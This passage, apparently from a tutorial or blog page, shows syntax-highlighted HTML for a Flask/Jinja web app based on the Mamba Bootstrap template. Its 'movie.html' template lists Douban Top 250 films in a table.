class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="movie-html"><a href="#movie-html" class="headerlink" title="movie.html"></a>movie.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>table table-striped<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影中文名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影外文名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影评分<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影评价人数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影概述<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>其他信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>           &#123;% for movie in movies %&#125;               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[0] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; movie[1] &#125;&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                   &#123;&#123; movie[3] &#125;&#125;                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[4] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[5] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[6] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[7] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[8] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>           &#123;% endfor %&#125;       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span 